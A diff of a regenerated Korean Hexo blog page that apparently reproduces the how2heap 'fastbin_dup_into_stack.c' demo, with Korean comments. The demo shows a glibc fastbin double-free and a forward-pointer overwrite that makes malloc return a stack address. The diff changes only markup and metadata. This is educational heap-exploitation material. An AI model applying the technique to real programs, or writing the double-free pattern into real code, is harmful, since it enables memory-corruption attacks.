@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8">
-	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416">
+<head>
+    <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="utf-8" />
+	<meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416"/>
 	<!-- Global site tag (gtag.js) - Google Analytics -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140827316-1"></script>
 	<script>
@@ -18,54 +18,72 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-        <meta name="keywords" content="Theory">
+        <meta name="keywords" content="Theory" />
     
-    <meta name="description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;	fprintf(stderr, &quot;ma">
-<meta name="keywords" content="Theory">
+    <meta name="description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&amp;#123;	fprintf(stderr, &amp;qu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[How2Heap] fastbin_dup_into_stack">
 <meta property="og:url" content="https://j0n9hyun.xyz/theory/How2Heap-fastbin-dup-into-stack-c/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;	fprintf(stderr, &quot;ma">
-<meta property="og:locale" content="ko">
+<meta property="og:description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&amp;#123;	fprintf(stderr, &amp;qu">
+<meta property="og:locale" content="ko_KR">
 <meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png">
-<meta property="og:updated_time" content="2019-05-29T07:15:56.000Z">
+<meta property="article:published_time" content="2019-05-27T12:36:51.000Z">
+<meta property="article:modified_time" content="2019-05-29T07:15:56.000Z">
+<meta property="article:author" content="j0n9hyun">
+<meta property="article:tag" content="Theory">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[How2Heap] fastbin_dup_into_stack">
-<meta name="twitter:description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;	fprintf(stderr, &quot;ma">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png">
     
-	<link rel="canonical" href="https://j0n9hyun.xyz/theory/how2heap-fastbin-dup-into-stack-c/">
+	<link rel="canonical" href="https://j0n9hyun.xyz/theory/how2heap-fastbin-dup-into-stack-c/"/>
 
     
 
     
-        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico">
+        <link rel="icon" href="https://ctf.j0n9hyun.xyz/files/fbf1004228885fb7ac783e1d540d4538/vector.ico" />
     
 
-    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
-    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
 
-	<link rel="stylesheet" type="text/css" href>
-	<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">	
-	<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
-    <link rel="stylesheet" href="/css/style.css">
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
 
-    <script src="/libs/jquery/3.3.1/jquery.min.js"></script>
     
-    
-        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
-    
-    
-        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-    
-    
-    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
 
 
-</head>
-</html>
+	<link rel="stylesheet" type="text/css" href="">
+	
+<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">
+	
+	
+<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+
+
+<meta name="generator" content="Hexo 5.0.2"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
 <body>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="wrap">
         <header id="header">
@@ -93,13 +111,13 @@
                     <div class="nav-container-inner">
                         <ul id="main-nav">
                             
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/">Home</a>
                                 </li>
                             
                                         <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/">Develop</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Rev/">Rev</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/misc/">misc</a></li></ul></li></ul>
                                     
-                                <li class="main-nav-list-item">
+                                <li class="main-nav-list-item" >
                                     <a class="main-nav-list-link" href="/about">About</a>
                                 </li>
                             
@@ -108,14 +126,14 @@
                             <div id="search-form-wrap">
 
     <form class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="검색">
+        <input type="text" class="ins-search-input search-form-input" placeholder="검색" />
         <button type="submit" class="search-form-submit"></button>
     </form>
     <div class="ins-search">
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="입력">
+            <input type="text" class="ins-search-input" placeholder="입력" />
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -139,7 +157,9 @@
     window.INSIGHT_CONFIG = INSIGHT_CONFIG;
 })(window);
 </script>
+
 <script src="/js/insight.js"></script>
+
 
 </div>
                         </nav>
@@ -189,21 +209,21 @@
                 
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/Theory/">Theory</a>
+        <a class="tag-link-link" href="/tags/Theory/" rel="tag">Theory</a>
     </div>
 
-  			<span class="reading-time">⏱ 4 분</span>
+  			<span class="reading-time">⏱ 5 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_stackc"><a class="markdownIt-Anchor" href="#fastbin_dup_into_stackc"></a> fastbin_dup_into_stack.c</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n"</span></span><br><span class="line">			<span class="string">"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc이 반환해야 할 주소: %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span></span><br><span class="line">		<span class="string">"이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p ]\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\n"</span></span><br><span class="line">		<span class="string">"그래서 stack에 fake free size(0x20)를 써준다.\n"</span></span><br><span class="line">		<span class="string">"그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\n"</span></span><br><span class="line">		<span class="string">"그곳으로 포인터를 반환할 것이다.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, free list에 stack 주소를 넣는다.\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br>
-<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png"><br>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n&quot;</span></span><br><span class="line">			<span class="string">&quot;이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc이 반환해야 할 주소: %p.\n&quot;</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;버퍼를 3개 할당한다.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc a(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc b(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc c(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;-------free(a)-------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;-------free(b)-------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;-------free(a)-------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free list: [ %p, %p, %p ]\n&quot;</span></span><br><span class="line">		<span class="string">&quot;이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free list: [ %p ]\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;그래서 stack에 fake free size(0x20)를 써준다.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\n&quot;</span></span><br><span class="line">		<span class="string">&quot;그곳으로 포인터를 반환할 것이다.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, free list에 stack 주소를 넣는다.\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br />
+<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png"><br />
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58422108-b4696300-80cc-11e9-9c6f-31db09f069bb.png"></p>
 <center>
-<p><strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">Source</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c">Source</a></strong></p>
 </center>
 <style>
   img.border-shadow{
@@ -218,7 +238,7 @@
 
 
 
-    <a data-url="https://j0n9hyun.xyz/theory/How2Heap-fastbin-dup-into-stack-c/" data-id="ck5p1non7001jlyfpebbb7b1d" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="https://j0n9hyun.xyz/theory/How2Heap-fastbin-dup-into-stack-c/" data-id="ckdzanqec001nz5mpag8tc2el" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -297,7 +317,7 @@
         "dateModified": "2019-05-29",
         "url": "https://j0n9hyun.xyz/theory/How2Heap-fastbin-dup-into-stack-c/",
         "description": " fastbin_dup_into_stack.c
-12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;	fprintf(stderr, "ma"
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;	fprintf(stderr, &qu"
         "wordCount": 408
     }
 </script>
@@ -415,7 +435,7 @@
     <div class="widget-wrap widget-list">
         <h3 class="widget-title">태그</h3>
         <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/">Wargame</a><span class="tag-list-count">3</span></li></ul>
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/" rel="tag">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/" rel="tag">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/" rel="tag">Wargame</a><span class="tag-list-count">3</span></li></ul>
         </div>
     </div>
 
@@ -470,25 +490,47 @@
 
 
     
-        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
     
     
-        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
     
     
 
 
 
 <!-- Custom Scripts -->
+
 <script src="/js/main.js"></script>
+
 
     </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </body>
